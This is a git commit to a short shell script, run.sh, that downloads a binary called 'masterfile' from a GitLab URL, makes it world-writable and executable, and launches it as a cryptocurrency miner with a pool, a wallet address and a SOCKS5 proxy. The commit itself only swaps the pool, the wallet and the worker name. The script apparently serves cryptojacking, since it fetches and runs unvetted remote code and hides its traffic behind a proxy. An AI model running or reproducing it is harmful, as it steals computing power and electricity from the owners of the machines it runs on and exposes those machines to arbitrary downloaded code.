ab4cca6c94a7b7a8708e1692658a540cdd1fbfe5
CornellAlarcon <89951532+CornellAlarcon@users.noreply.github.com>
2021-09-02 01:03:15 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
 chmod 777 masterfile
-POOL=us-qrl.volt-mine.com:1111
-WALLET=Q010500d0c32b2ca3f896998fbbfc3aecfb17a32e47965ab3496e92eeadc02dd6ee6ba82bac7343
-WORKER=voc
+POOL=dcy.pool-pay.com:5657
+WALLET=NYz4eppo5MsY3WqgrRVzDZ4P6eqVrfRKBLffuLmvvPYzA2MXhT5v6Y7BFYx2HkQNuL9MND7CQvi73CWpd9y57dhV4ySD1iy8ez
+WORKER=endvoc
 PROXY=socks5://192.252.209.155:14455
 ./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
